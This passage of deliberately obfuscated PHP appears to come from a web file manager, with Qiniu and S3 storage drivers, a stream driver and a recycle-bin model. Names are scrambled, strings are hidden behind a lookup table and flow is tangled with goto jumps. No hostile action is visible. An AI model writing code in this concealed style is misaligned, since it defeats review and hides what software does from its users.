(!empty($D‹‰ì‰‹Š¹[$Eî§ÁÄñ[1211]])) { $f¤£”ª©‹ += count($D‹‰ì‰‹Š¹[$Eî§ÁÄñ[1211]]); } if ($DèšÄÓ‹¯š === $Eî§ÁÄñ[33]) { break; } continue; } if ($D¡ƒ¶Õ—œ) { if (!empty($D‹‰ì‰‹Š¹[$Eî§ÁÄñ[1208]])) { return !0; } } else { if (!empty($D‹‰ì‰‹Š¹[$Eî§ÁÄñ[1211]])) { return !0; } } if ($DèšÄÓ‹¯š == $Eî§ÁÄñ[33]) { break; } } goto f¯õÑ™ÍÒğ; EÀçéÏ…š³: } public function listAll($F©…´¶¢·) { $f…‰œ–ä×ï =& $_SERVER[Î¿—”òá]; $d½–´¥Ì¦Ì = $this->fileList($F©…´¶¢·, 1); $DªƒªÊİÊï = array(); foreach ($d½–´¥Ì¦Ì as $B²¦‡öïá) { $DªƒªÊİÊï[$B²¦‡öïá[$f…‰œ–ä×ï[28]]] = $B²¦‡öïá[$f…‰œ–ä×ï[77]]; } return $this->listAllFiles($F©…´¶¢·, array_keys($DªƒªÊİÊï), $DªƒªÊİÊï); } public function canRead($C½‚ÙÛ œ”) { return $this->exist($C½‚ÙÛ œ”) ? !0 : !1; } public function canWrite($eÀã®›Ä°•) { return $this->exist($eÀã®›Ä°•) ? !0 : !1; } public function getContent($DƒÁ¥ø¸Õğ) { return $this->fileSubstr($DƒÁ¥ø¸Õğ, 0, -1); } public function setContent($CÌ²İÓÃ„×, $B×‚ˆ…÷ = '') { $bŠ‰˜¬Ä = $this->tempFile($this->pathThis($CÌ²İÓÃ„×)); file_put_contents($bŠ‰˜¬Ä, $B×‚ˆ…÷); if ($this->upload($CÌ²İÓÃ„×, $bŠ‰˜¬Ä)) { $this->tempFileRemve($bŠ‰˜¬Ä); return !0; } return !1; } public function refreshUrls($cØîÓ·ŸÇ‰) { goto c•¹»¢¾²Ñ; a·ø†¿ê‚Ó: return $E—ÁÜÑ—Á[$CÛÍÖ¶Ô‡[1212]] == $CÛÍÖ¶Ô‡[692] ? !0 : !1; goto AÖ˜†ºÛª; E˜æ©‹Ø£ã: $dÖÍ‡ÃŠæ¼ = new Qiniu\Cdn\CdnManager($this->auth); list($E—ÁÜÑ—Á, $e½„¿¸òºÀ) = $dÖÍ‡ÃŠæ¼->refreshUrls($Fé©ªõ‚¿); if ($e½„¿¸òºÀ) { return !1; } goto a·ø†¿ê‚Ó; c•¹»¢¾²Ñ: $CÛÍÖ¶Ô‡ =& $_SERVER[Î¿—”òá]; $Fé©ªõ‚¿ = array(); if (is_array($cØîÓ·ŸÇ‰)) { foreach ($cØîÓ·ŸÇ‰ as $a™—‚ª§‚à) { $Fé©ªõ‚¿[] = $this->link($a™—‚ª§‚à); } } else { $Fé©ªõ‚¿[] = $this->link($cØîÓ·ŸÇ‰); } goto E˜æ©‹Ø£ã; AÖ˜†ºÛª: } public function fileSubstr($fÉ®ÛÙÛøâ, $cæ÷”ÄÇÈÈ, $aé¼®É³Õ¦) { $bÏÓïàÑ =& $_SERVER[Î¿—”òá]; if (!($f™İ¹ˆ’’° = $this->link($fÉ®ÛÙÛøâ))) { return !1; } $DÆÆËÍÅÅ = !1; if ($aé¼®É³Õ¦ > 0) { $Cº‘Üßç× = $cæ÷”ÄÇÈÈ + $aé¼®É³Õ¦ - 1; $DÆÆËÍÅÅ = array($bÏÓïàÑ[1213] . $cæ÷”ÄÇÈÈ . $bÏÓïàÑ[412] . $Cº‘Üßç×); } $F¨ùâ½Ø§§ = url_request($f™İ¹ˆ’’°, $bÏÓïàÑ[216], !1, $DÆÆËÍÅÅ); return $F¨ùâ½Ø§§[$bÏÓïàÑ[685]] ? $F¨ùâ½Ø§§[$bÏÓïàÑ[1027]] : !1; } public function upload($ağÅ²ö¼Äº, $fÄÚ¥„——Œ, $eèó²ª Ãà = false, $Fµº¶Ó¾© = REPEAT_REPLACE) { $BˆÏÒ’àˆ = new Qiniu\Storage\UploadManager(); $bİÚÙğ¶¼Ó = $this->auth->uploadToken($this->bucket, $ağÅ²ö¼Äº); $b¸³•ù¬í = get_file_mime(get_path_ext($fÄÚ¥„——Œ)); list($fÂ”àäÁË, $AÏ›æ÷ œ) = $BˆÏÒ’àˆ->putFile($bİÚÙğ¶¼Ó, $ağÅ²ö¼Äº, $fÄÚ¥„——Œ, null, $b¸³•ù¬í); return $AÏ›æ÷ œ ? !1 : $this->getPathOuter($ağÅ²ö¼Äº); } public function uploadFormData($B‚½æÍ±¶, $bµ÷‡ª—™ = 3600) { return $this->uploadToken($B‚½æÍ±¶, $bµ÷‡ª—™); } public function multiUploadFormData($d†ÆŒ¯ß¢œ, $EÕ‚ªöÍÌÁ = 3600) { return $this->uploadToken($d†ÆŒ¯ß¢œ, $EÕ‚ªöÍÌÁ); } private function uploadToken($C²‚ÕÉËÂâ, $dõÜ–ğ¡êŠ = 3600) { goto Bë£Â×µ’¶; Bë£Â×µ’¶: $B§áŠò¯ê =& $_SERVER[Î¿—”òá]; $döÒ™âÚÃĞ = $dõÜ–ğ¡êŠ; $c‹¢óÖó¯œ = array($B§áŠò¯ê[1214] => $B§áŠò¯ê[1215]); goto EÒø„éŞº§; EÒø„éŞº§: $BŸ‡¹øÇ­ø = null; $aèÆ×®ç¸Í = $this->auth->uploadToken($this->bucket, $BŸ‡¹øÇ­ø, $döÒ™âÚÃĞ, $c‹¢óÖó¯œ, !0); $A¾åÖ…êöô = empty($this->region) || $this->region == $B§áŠò¯ê[1216] ? $B§áŠò¯ê[33] : $B§áŠò¯ê[412] . $this->region; goto A½ËØ¾óß²; A½ËØ¾óß²: $bßâ…Ó×›Å = http_type() . "\72\x2f\x2f\x75\160\x6c\x6f\141\x64{$A¾åÖ…êöô}\x2e\x71\151\x6e\x69\165\160\56\x63\157\x6d\57"; return array($B§áŠò¯ê[1217] => $aèÆ×®ç¸Í, $B§áŠò¯ê[1218] => $bßâ…Ó×›Å); goto b‚ëæ¿ŸŠÍ; b‚ëæ¿ŸŠÍ: } public function download($E¦ßçè¡Ş, $C¾£Ñ¹ËÈ) { goto CÖ°Óã¶µ; fÈÆ„£‡ğ: $A¨½š¾á = 1024 * 200; $F¸²ì†ò® = fopen($fæÈá‡œ¹ë, $_SERVER[Î¿—”òá][1219]); while (!0) { $bø¤İÑù—ç = $this->fileSubstr($E¦ßçè¡Ş, $cãá×ÆÉ×, $A¨½š¾á); if ($bø¤İÑù—ç === !1) { return !1; } fwrite($F¸²ì†ò®, $bø¤İÑù—ç); $cãá×ÆÉ× += $A¨½š¾á; if (strlen($bø¤İÑù—ç) < $A¨½š¾á) { break; } } goto d®´´ŠÅ‚¨; d®´´ŠÅ‚¨: fclose($F¸²ì†ò®); return $C¾£Ñ¹ËÈ; goto Eñ©ÑĞÍè; CÖ°Óã¶µ: $fæÈá‡œ¹ë = IO::getPathInner(IO::mkfile($C¾£Ñ¹ËÈ)); if (!($C‡ìò±Ê = $this->link($E¦ßçè¡Ş))) { return !1; } $cãá×ÆÉ× = 0; goto fÈÆ„£‡ğ; Eñ©ÑĞÍè: } public function link($cÃ’ÓÅê, $CêÕŞˆåøƒ = '') { if (!$this->isFile($cÃ’ÓÅê)) { return !1; } $AùºÒÌåÒÏ = $this->getHost() . $_SERVER[Î¿—”òá][8] . $this->pathEncode($cÃ’ÓÅê) . $CêÕŞˆåøƒ; return $this->auth->privateDownloadUrl($AùºÒÌåÒÏ, 3600 * 12); } public function fileOut($FáÛ¿ë‡¹Ò, $E°„§¶º¿À = false, $dè‚îÚ·İš = false, $fñÄã©¶¦ = '') { $CÜ¾ĞÔÊÂ“ =& $_SERVER[Î¿—”òá]; if (!$dè‚îÚ·İš) { $dè‚îÚ·İš = $this->pathThis($FáÛ¿ë‡¹Ò); } $b¨ôÃÉºè = $E°„§¶º¿À ? $CÜ¾ĞÔÊÂ“[1220] . rawurlencode($dè‚îÚ·İš) : $CÜ¾ĞÔÊÂ“[33]; $dèöÜ‹­ª­ = $this->link($FáÛ¿ë‡¹Ò, $b¨ôÃÉºè); $this->fileOutLink($dèöÜ‹­ª­); } public function fileOutServer($e°Üƒ°ñÍ, $F¡ò’ì–ÉŒ = false, $E°ŒÙ…Á‹æ = false, $B°¦µ™·ª = '') { parent::fileOut($e°Üƒ°ñÍ, $F¡ò’ì–ÉŒ, $E°ŒÙ…Á‹æ, $B°¦µ™·ª); } public function fileOutImage($C†äá‰ë„, $F­Í—¸µ½Ş = 250) { $aÔ‘çî‰ìÛ = $this->link($C†äá‰ë„, $_SERVER[Î¿—”òá][1221] . $F­Í—¸µ½Ş); $this->fileOutLink($aÔ‘çî‰ìÛ); } public function fileOutImageServer($c±¾¦ºÁ‹Œ, $CÛ¼ÁÙÛ•± = 250) { parent::fileOutImage($c±¾¦ºÁ‹Œ, $CÛ¼ÁÙÛ•±); } public function hashMd5($d·ÊğÁ¾™§) { $BåŒÀÇåÁ =& $_SERVER[Î¿—”òá]; $e†ÕÚÒóÖ = $this->objectMeta($d·ÊğÁ¾™§); return isset($e†ÕÚÒóÖ[$BåŒÀÇåÁ[196]]) ? $e†ÕÚÒóÖ[$BåŒÀÇåÁ[196]] : !1; $dêëé‡Äƒí = $this->link($d·ÊğÁ¾™§, $BåŒÀÇåÁ[1222]); } public function size($c‡ŠÃ¨Š–¸) { $Féí„˜éª = $this->objectMeta($c‡ŠÃ¨Š–¸); return $Féí„˜éª ? $Féí„˜éª[$_SERVER[Î¿—”òá][77]] : 0; } public function info($C„‡†×Ş‰Ä) { if ($this->isFolder($C„‡†×Ş‰Ä)) { return $this->folderInfo($C„‡†×Ş‰Ä); } else { if ($this->isFile($C„‡†×Ş‰Ä)) { return $this->fileInfo($C„‡†×Ş‰Ä); } } return !1; } public function exist($f•Â‹§›) { return $this->isFile($f•Â‹§›) || $this->isFolder($f•Â‹§›); } public function isFile($D§øŸË˜‡) { return !$this->isFolder($D§øŸË˜‡) && $this->objectMeta($D§øŸË˜‡); } public function isFolder($FÏ²Çé‘ùÎ) { return $this->cacheMethod($_SERVER[Î¿—”òá][223], $FÏ²Çé‘ùÎ); } protected function objectMeta($aĞØÇº³°°) { return $this->cacheMethod($_SERVER[Î¿—”òá][224], $aĞØÇº³°°); } protected function _objectMeta($F æ‡¥¶½ƒ) { $b·áœ“¶“‘ =& $_SERVER[Î¿—”òá]; list($f¦« ì¸†Å, $añ‰ÂÄÚˆÍ) = $this->bucketManager->stat($this->bucket, $F æ‡¥¶½ƒ); if ($f¦« ì¸†Å) { $f¦« ì¸†Å[$b·áœ“¶“‘[77]] = intval($f¦« ì¸†Å[$b·áœ“¶“‘[1209]]); } return $f¦« ì¸†Å; } protected function _isFolder($a¿ĞÛº²ô¸) { $Aµ†¬ê³Î =& $_SERVER[Î¿—”òá]; if ($a¿ĞÛº²ô¸ == $Aµ†¬ê³Î[33] || $a¿ĞÛº²ô¸ == $Aµ†¬ê³Î[8]) { return !0; } list($D…–‰ƒ× Ä, $bÕµ±ÀÆŸœ) = $this->bucketManager->listFiles($this->bucket, trim($a¿ĞÛº²ô¸, $Aµ†¬ê³Î[8]) . $Aµ†¬ê³Î[8], $Aµ†¬ê³Î[33], 1, $Aµ†¬ê³Î[8]); return !empty($D…–‰ƒ× Ä[$Aµ†¬ê³Î[1208]]) || !empty($D…–‰ƒ× Ä[$Aµ†¬ê³Î[1211]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($b™£œ­İêÁ) { parent::__construct($b™£œ­İêÁ); } public function uploadFormData($a¦¸Èèµ¼Ì, $E£¥‘ø„Ü = 3600) { goto eÆŒå±©Ø; f¹ƒ‚‰ŞÑ¶: $dÍóÂî ‚æ = array($aÆœ‰ó¸ë[199] => $aÆœ‰ó¸ë[33], $aÆœ‰ó¸ë[1139] => $aÆœ‰ó¸ë[33], $aÆœ‰ó¸ë[1097] => $E…š”Åã‹, $aÆœ‰ó¸ë[1101] => $dßÃ»ŞÙ, $aÆœ‰ó¸ë[1105] => $d•Šã©Á…, $aÆœ‰ó¸ë[1140] => $Fäˆ”Úİ…¦, $aÆœ‰ó¸ë[1141] => $f¯Èİª“¢º, $aÆœ‰ó¸ë[1142] => $dÈšò¬ÀÔ , $aÆœ‰ó¸ë[1143] => $e¾ğÎñ†Ğ, $aÆœ‰ó¸ë[1144] => $d¯‡ˆãÇ«ö, $aÆœ‰ó¸ë[169] => $this->getHost()); return $dÍóÂî ‚æ; goto d°»‡òéÒ; eÆŒå±©Ø: $aÆœ‰ó¸ë =& $_SERVER[Î¿—”òá]; $E…š”Åã‹ = $aÆœ‰ó¸ë[185]; $f¯Èİª“¢º = $aÆœ‰ó¸ë[1127]; goto AÕó‘ÒÖ«; a¶•Ğ¯¿°…: $e‚‹Íâ‰˜× = $aÆœ‰ó¸ë[1129]; $e¾ğÎñ†Ğ = $E£¥‘ø„Ü . $aÆœ‰ó¸ë[33]; $dßÃ»ŞÙ = $aÆœ‰ó¸ë[1093]; goto d•ÙËà—Î; AÕó‘ÒÖ«: $C¤£‘ğ£‚ó = $aÆœ‰ó¸ë[59]; $dÈšò¬ÀÔ  = gmdate($aÆœ‰ó¸ë[1128]); $aÂ¨Æ²´È = gmdate($aÆœ‰ó¸ë[686]); goto a¶•Ğ¯¿°…; DØÇÆÎ½£É: $d•Šã©Á… = base64_encode(json_encode($aá¶ŸÁğó¯)); $FùÇô³ª©† = hash_hmac($aÆœ‰ó¸ë[1137], $aÂ¨Æ²´È, $aÆœ‰ó¸ë[1138] . $this->secret, !0); $bëØ«ï¤†÷ = hash_hmac($aÆœ‰ó¸ë[1137], $this->region, $FùÇô³ª©†, !0); goto D’ÔÂÇÈ­Î; D’ÔÂÇÈ­Î: $B‘®œÎõß = hash_hmac($aÆœ‰ó¸ë[1137], $C¤£‘ğ£‚ó, $bëØ«ï¤†÷, !0); $b”™…‡Î± = hash_hmac($aÆœ‰ó¸ë[1137], $e‚‹Íâ‰˜×, $B‘®œÎõß, !0); $d¯‡ˆãÇ«ö = hash_hmac($aÆœ‰ó¸ë[1137], $d•Šã©Á…, $b”™…‡Î±); goto f¹ƒ‚‰ŞÑ¶; d•ÙËà—Î: $fÙ¥Ä¿¹í = array($this->accessKey, $aÂ¨Æ²´È, $this->region, $C¤£‘ğ£‚ó, $e‚‹Íâ‰˜×); $Fäˆ”Úİ…¦ = implode($aÆœ‰ó¸ë[8], $fÙ¥Ä¿¹í); $aá¶ŸÁğó¯ = array($aÆœ‰ó¸ë[1095] => gmdate($aÆœ‰ó¸ë[1094], strtotime($aÆœ‰ó¸ë[1130])), $aÆœ‰ó¸ë[1096] => array(array($aÆœ‰ó¸ë[1098] => $this->bucket), array($aÆœ‰ó¸ë[1097] => $E…š”Åã‹), array($aÆœ‰ó¸ë[1099], $aÆœ‰ó¸ë[1100], $aÆœ‰ó¸ë[33]), array($aÆœ‰ó¸ë[1099], $aÆœ‰ó¸ë[1131], $aÆœ‰ó¸ë[33]), array($aÆœ‰ó¸ë[1099], $aÆœ‰ó¸ë[1132], $aÆœ‰ó¸ë[33]), array($aÆœ‰ó¸ë[1101] => $dßÃ»ŞÙ), array($aÆœ‰ó¸ë[1133] => $Fäˆ”Úİ…¦), array($aÆœ‰ó¸ë[1134] => $f¯Èİª“¢º), array($aÆœ‰ó¸ë[1135] => $dÈšò¬ÀÔ ), array($aÆœ‰ó¸ë[1136] => $e¾ğÎñ†Ğ))); goto DØÇÆÎ½£É; d°»‡òéÒ: } public function multiUploadFormData($Aô¼ÉÉ…è, $f©à¥ŒŞÒÚ = 3600) { $D™‘ßºÒÜ¢ =& $_SERVER[Î¿—”òá]; $bÙì°å°åº = gmdate($D™‘ßºÒÜ¢[1223]); $BÕ¨ÁÜ™íÆ = array(); $D–º™„ò = $this->client->getUploadId($this->bucket, $Aô¼ÉÉ…è, $BÕ¨ÁÜ™íÆ); if (!$D–º™„ò) { return !1; } return array($D™‘ßºÒÜ¢[209] => $D–º™„ò, $D™‘ßºÒÜ¢[169] => $this->getHost() . $D™‘ßºÒÜ¢[8] . $this->pathEncode($Aô¼ÉÉ…è), $D™‘ßºÒÜ¢[210] => $bÙì°å°åº, $D™‘ßºÒÜ¢[89] => $Aô¼ÉÉ…è); } public function multiUploadAuthData($D™…×÷ø’­, $FÆÜïÀØ±— = array()) { goto e¢´‹„ğå‡; cßò×¯‚: if (isset($FÆÜïÀØ±—[$e¯¾­ËÅ²¦[1224]])) { $Fõ¹œºà‘ö[$e¯¾­ËÅ²¦[1225]] = $FÆÜïÀØ±—[$e¯¾­ËÅ²¦[1224]]; } $dñô¹¦ï± = explode($e¯¾­ËÅ²¦[171], $this->getHost()); $dõ¿İœ×Ô = array($e¯¾­ËÅ²¦[1226] => $dñô¹¦ï±[1], $e¯¾­ËÅ²¦[1227] => $e¯¾­ËÅ²¦[33], $e¯¾­ËÅ²¦[199] => $e¯¾­ËÅ²¦[116], $e¯¾­ËÅ²¦[1139] => $FÆÜïÀØ±—[$e¯¾­ËÅ²¦[77]]); goto bòÚ½†—; e¢´‹„ğå‡: $e¯¾­ËÅ²¦ =& $_SERVER[Î¿—”òá]; $e­ˆ³ğ‘Ê” = isset($FÆÜïÀØ±—[$e¯¾­ËÅ²¦[160]]) ? $FÆÜïÀØ±—[$e¯¾­ËÅ²¦[160]] : $e¯¾­ËÅ²¦[33]; $AªŒõßİµ¿ = $FÆÜïÀØ±—[$e¯¾­ËÅ²¦[89]]; goto a¤çƒÉÑ­; Bˆ İˆ¥Ç§: if (strpos($e­ˆ³ğ‘Ê”, $e¯¾­ËÅ²¦[213]) === 0) { if (isset($Fõ¹œºà‘ö[$e¯¾­ËÅ²¦[1225]])) { $aß’®‚®¬É = $Fõ¹œºà‘ö[$e¯¾­ËÅ²¦[1225]]; } else { if (isset($b—‚¡‹ÍÛ[$e¯¾­ËÅ²¦[1225]])) { $aß’®‚®¬É = $b—‚¡‹ÍÛ[$e¯¾­ËÅ²¦[1225]]; } else { $aß’®‚®¬É = hash($e¯¾­ËÅ²¦[1137], $e¯¾­ËÅ²¦[33]); } } return array($e¯¾­ËÅ²¦[220] => $b—‚¡‹ÍÛ[$e¯¾­ËÅ²¦[220]], $e¯¾­ËÅ²¦[1225] => $aß’®‚®¬É, $e¯¾­ËÅ²¦[210] => $b—‚¡‹ÍÛ[$e¯¾­ËÅ²¦[1228]]); } return $b—‚¡‹ÍÛ[$e¯¾­ËÅ²¦[220]]; goto CàÈñÖ´îô; a¤çƒÉÑ­: unset($FÆÜïÀØ±—[$e¯¾­ËÅ²¦[89]]); if (isset($FÆÜïÀØ±—[$e¯¾­ËÅ²¦[211]])) { return $this->listUploadParts($AªŒõßİµ¿, $FÆÜïÀØ±—); } $Fõ¹œºà‘ö = array(); goto cßò×¯‚; bòÚ½†—: $f¸Ûˆ›³Ê„ = $e¯¾­ËÅ²¦[214]; $dõº„Š›Ô = $e¯¾­ËÅ²¦[8] . $this->pathEncode($AªŒõßİµ¿) . $e­ˆ³ğ‘Ê”; $b—‚¡‹ÍÛ = $this->client->__getSignatureV4($Fõ¹œºà‘ö, $dõ¿İœ×Ô, $f¸Ûˆ›³Ê„, $dõº„Š›Ô); goto Bˆ İˆ¥Ç§; CàÈñÖ´îô: } public function listUploadParts($b·ëˆ¨Ûğ², $CÚ¹ÜçäåŠ = array()) { goto F‘“÷Áã÷Ê; Cè«ë„ôÕá: $dÏáğáÁ .= $dÃ‡ßµê–Ÿ[1232]; $A—¼ï³¹‘ø = array(); $a®¾¤Ç”ò¿ = explode($dÃ‡ßµê–Ÿ[171], $this->getHost()); goto F¾¦‹ÓÁîİ; CÏ—Õä…ƒ: $b«Š†ÃÅÚ¥ = $this->client->__getSignatureV4($A—¼ï³¹‘ø, $FóÊÑ§£ïŒ, $Dğ£‡¾Á¾Ä, $f˜«İ«äÇ, $dÏáğáÁ); return array($dÃ‡ßµê–Ÿ[220] => $b«Š†ÃÅÚ¥[$dÃ‡ßµê–Ÿ[220]], $dÃ‡ßµê–Ÿ[210] => $b«Š†ÃÅÚ¥[$dÃ‡ßµê–Ÿ[1228]], $dÃ‡ßµê–Ÿ[222] => $Fáƒá˜ôß, $dÃ‡ßµê–Ÿ[1225] => $b«Š†ÃÅÚ¥[$dÃ‡ßµê–Ÿ[1225]]); goto dÊº•™Ê•°; F¾¦‹ÓÁîİ: $FóÊÑ§£ïŒ = array($dÃ‡ßµê–Ÿ[1226] => $a®¾¤Ç”ò¿[1], $dÃ‡ßµê–Ÿ[199] => $dÃ‡ßµê–Ÿ[116], $dÃ‡ßµê–Ÿ[1139] => strlen($dÏáğáÁ)); $Dğ£‡¾Á¾Ä = $dÃ‡ßµê–Ÿ[212]; $f˜«İ«äÇ = $dÃ‡ßµê–Ÿ[8] . $this->pathEncode($b·ëˆ¨Ûğ²) . $CÚ¹ÜçäåŠ[$dÃ‡ßµê–Ÿ[160]]; goto CÏ—Õä…ƒ; E´Æİ¸Ö : if (!$Fáƒá˜ôß) { return !1; } $dÏáğáÁ = $dÃ‡ßµê–Ÿ[1229]; foreach ($Fáƒá˜ôß as $fÁÎ•…·­¸) { $dÏáğáÁ .= $dÃ‡ßµê–Ÿ[1230] . "\x3c\x50\141\x72\x74\x4e\165\155\142\x65\x72\x3e{$fÁÎ•…·­¸[$dÃ‡ßµê–Ÿ[1181]]}\74\57\120\141\162\164\116\x75\155\142\x65\162\76\12" . "\74\105\124\x61\147\76{$fÁÎ•…·­¸[$dÃ‡ßµê–Ÿ[1182]]}\x3c\x2f\x45\x54\141\147\x3e\xa" . $dÃ‡ßµê–Ÿ[1231]; } goto Cè«ë„ôÕá; F‘“÷Áã÷Ê: $dÃ‡ßµê–Ÿ =& $_SERVER[Î¿—”òá]; $D¯ñÑˆï³Ú = str_replace($dÃ‡ßµê–Ÿ[221], $dÃ‡ßµê–Ÿ[33], $CÚ¹ÜçäåŠ[$dÃ‡ßµê–Ÿ[160]]); $Fáƒá˜ôß = $this->client->listParts($this->bucket, $b·ëˆ¨Ûğ², $D¯ñÑˆï³Ú); goto E´Æİ¸Ö ; dÊº•™Ê•°: } public function link($BĞ¢ÄÕŒ¼œ, $E—ßì÷±« = array()) { return parent::link($BĞ¢ÄÕŒ¼œ, $E—ßì÷±«); } public function fileOut($Eçº©ùØ»¿, $fËì„ÛÇ½ = false, $fëÖÎ•×íè = false, $cº»¬äŞ‡ = '') { if (strstr($this->endpoint, $_SERVER[Î¿—”òá][1233])) { return parent::fileOutServer($Eçº©ùØ»¿, $fËì„ÛÇ½, $fëÖÎ•×íè, $cº»¬äŞ‡); } parent::fileOut($Eçº©ùØ»¿, $fËì„ÛÇ½, $fëÖÎ•×íè, $cº»¬äŞ‡); } public function fileOutImage($CŞéæˆã°, $bº„‹÷åƒ = 250) { if (strstr($this->endpoint, $_SERVER[Î¿—”òá][1233])) { return parent::fileOutImageServer($CŞéæˆã°, $bº„‹÷åƒ); } parent::fileOutImage($CŞéæˆã°, $bº„‹÷åƒ); } public function fileOutLink($a‚ïğÒ„ìÀ) { $dÀ¤Åêâğ´ =& $_SERVER[Î¿—”òá]; if (substr($a‚ïğÒ„ìÀ, 0, 7) == $dÀ¤Åêâğ´[1108]) { $a‚ïğÒ„ìÀ = $dÀ¤Åêâğ´[1109] . substr($a‚ïğÒ„ìÀ, 7); } header($dÀ¤Åêâğ´[156] . $a‚ïğÒ„ìÀ); die; } public function getHost() { $eÌ…Ø‡äŞ =& $_SERVER[Î¿—”òá]; $bôæÚ™ó©÷ = str_rtrim(parent::getHost(), $eÌ…Ø‡äŞ[8] . $this->bucket); $bôæÚ™ó©÷ = explode($eÌ…Ø‡äŞ[171], $bôæÚ™ó©÷); return $bôæÚ™ó©÷[0] . $eÌ…Ø‡äŞ[171] . $this->bucket . $eÌ…Ø‡äŞ[91] . $bôæÚ™ó©÷[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($E–ªö¬†ÏÕ, $c°ÛÊŠèë = 0) { parent::__construct(); $this->source = $E–ªö¬†ÏÕ; $this->sourceSize = $c°ÛÊŠèë; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($dÂñ£ºµ•ß = false) { return $this->sourceSize; } public function getContent($FÜÒÑêôóğ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $c…Š—ŠÂÆÓ = ftell($this->source); $fò¦«Ş²¶ = @fread($this->source, $this->sourceSize); fseek($this->source, $c…Š—ŠÂÆÓ); return $fò¦«Ş²¶; } } public function fileSubstr($F¥æƒŸÉÎ‰ = false, $A½‹ŞÚÏä… = 0, $DŒ¡’ùÈší = 0) { if (!$DŒ¡’ùÈší) { $DŒ¡’ùÈší = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $A½‹ŞÚÏä…, $DŒ¡’ùÈší); } if ($this->sourceType == self::TYPE_FILE) { $d¿¸‹°›ğ¾ = ftell($this->source); fseek($this->source, $d¿¸‹°›ğ¾ + $A½‹ŞÚÏä…); $cèŞ°Â«ã‰ = @fread($this->source, $DŒ¡’ùÈší); fseek($this->source, $d¿¸‹°›ğ¾); return $cèŞ°Â«ã‰; } } public function hashMd5($bÉéõÑÒ‡ó = false) { return md5($this->getContent()); } public static function hash($DŠæƒô…”ñ, $bÅŠ˜ Ş× = 0) { $CÉ£’í¤ï = new PathDriverStream($DŠæƒô…”ñ, $bÅŠ˜ Ş×); return $CÉ£’í¤ï->hashSimple($DŠæƒô…”ñ); } public static function md5($EÖ‡Ë°“¿, $cç¥“ŸŠõá = 0) { $Aµ»“êç™Ú = new PathDriverStream($EÖ‡Ë°“¿, $cç¥“ŸŠõá); return $Aµ»“êç™Ú->hashMd5($EÖ‡Ë°“¿); } } goto FÊÔŸ‰Ü®¢; bö¢¼×â²: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\x63\x65\137\x72\145\143\x79\143\154\145"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\151\155\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\162\164", "\146\x75\x6e\x63\x74\x69\157\x6e")); public function listData($Cİù—°ğ• = false) { $b’×Ğ–Û =& $_SERVER[Î¿—”òá]; $Cİù—°ğ• = $Cİù—°ğ• ? $Cİù—°ğ• : USER_ID; $a´±Œ©ø¥´ = $this->where(array($b’×Ğ–Û[1420] => $Cİù—°ğ•))->select(); return array_to_keyvalue($a´±Œ©ø¥´, $b’×Ğ–Û[33], $b’×Ğ–Û[369]); } public function moveToRecycle($Fºè¦Óí¾Ä) { goto CÃ¼Ì™àØ†; c”éº««ó: if (!$b¸ºÈ›ŠÏ || $b¸ºÈ›ŠÏ[$FŠŠ´ñ“[397]] == $FŠŠ´ñ“[83]) { return; } $cÇ‡ò­• = array($FŠŠ´ñ“[383] => $Fºè¦Óí¾Ä, $FŠŠ´ñ“[1420] => USER_ID, $FŠŠ´ñ“[521] => $b¸ºÈ›ŠÏ[$FŠŠ´ñ“[371]], $FŠŠ´ñ“[522] => $b¸ºÈ›ŠÏ[$FŠŠ´ñ“[456]], $FŠŠ´ñ“[525] => $b¸ºÈ›ŠÏ[$FŠŠ´ñ“[459]]); $this->add($cÇ‡ò­•); goto F›ÎØå ¤; F›ÎØå ¤: $this->recycleMove($Fºè¦Óí¾Ä, 1); if ($b¸ºÈ›ŠÏ[$FŠŠ´ñ“[370]] == $FŠŠ´ñ“[83]) { $d¶´•ÄÎ¢ = array($FŠŠ´ñ“[525] => array($FŠŠ´ñ“[483], $b¸ºÈ›ŠÏ[$FŠŠ´ñ“[459]] . $Fºè¦Óí¾Ä . $FŠŠ´ñ“[484])); $e„—¦÷ÂÆØ->where($d¶´•ÄÎ¢)->setField($FŠŠ´ñ“[397], 1); } goto BİçÇŒó; CÃ¼Ì™àØ†: $FŠŠ´ñ“ =& $_SERVER[Î¿—”òá]; $e„—¦÷ÂÆØ = Model($FŠŠ´ñ“[1110]); $b¸ºÈ›ŠÏ = $e„—¦÷ÂÆØ->sourceInfo($Fºè¦Óí¾Ä); goto c”éº««ó; BİçÇŒó: } public function clear() { $this->remove(!1); } public function remove($bÎ‘…Ò¾ = false) { goto B¸»·Èºª; A§…„èãòÑ: $bÎ‘…Ò¾ = $bÎ‘…Ò¾ === !1 ? !1 : $bÎ‘…Ò¾; $eÆÊá°ÊÌ¬ = array(); foreach ($eÓËàË¥ë as $aª¬³£À”Ã) { if ($bÎ‘…Ò¾ != !1 && !in_array($aª¬³£À”Ã, $bÎ‘…Ò¾)) { continue; } $fîá‘Ğç‚Õ->remove($aª¬³£À”Ã, !1); $eØÄá”¿î = $this->where(array($DÊ´¥²•™ß[369] => $aª¬³£À”Ã))->find(); $aÕ’¶Õæé… = $eØÄá”¿î[$DÊ´¥²•™ß[371]] . $DÊ´¥²•™ß[70] . $eØÄá”¿î[$DÊ´¥²•™ß[456]]; $eÆÊá°ÊÌ¬[$aÕ’¶Õæé…] = array($DÊ´¥²•™ß[521] => $eØÄá”¿î[$DÊ´¥²•™ß[371]], $DÊ´¥²•™ß[456] => $eØÄá”¿î[$DÊ´¥²•™ß[456]]); $this->where(array($DÊ´¥²•™ß[369] => $aª¬³£À”Ã))->delete(); } goto eŞ¬‰ª»„ª; B¸»·Èºª: $DÊ´¥²•™ß =& $_SERVER[Î¿—”òá]; $fîá‘Ğç‚Õ = Model($DÊ´¥²•™ß[1110]); $eÓËàË¥ë = $this->listData(); goto A§…„èãòÑ; eŞ¬‰ª»„ª: foreach ($eÆÊá°ÊÌ¬ as $DğÎÎ†ŞŸ®) { 